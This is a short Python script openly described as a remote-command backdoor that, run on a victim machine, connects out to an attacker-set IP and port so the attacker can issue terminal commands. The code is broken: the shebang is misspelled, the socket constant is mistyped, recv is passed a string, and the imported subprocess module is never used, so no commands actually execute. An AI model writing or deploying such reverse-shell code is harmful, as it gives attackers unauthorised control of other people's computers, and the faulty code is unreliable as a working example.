#!/usr/biin/env python
"""
this progam allows an attacker to run basic terminal commands on a target computer (assuming that this code is executed on the target machine).
In order to use the program, make sure to change the host ip address and port. 
"""
import socket
import subprocess
connection = socket.socket(socket.AF_INET, socket.SCOCK_STREAM)
connection.connect(("10.0.0.1", 1234)) #Change these values 
connection.send("connection established ")

while True: 
  recvdata = connection.recv("1024")
  print(recvdata)

connection.close()
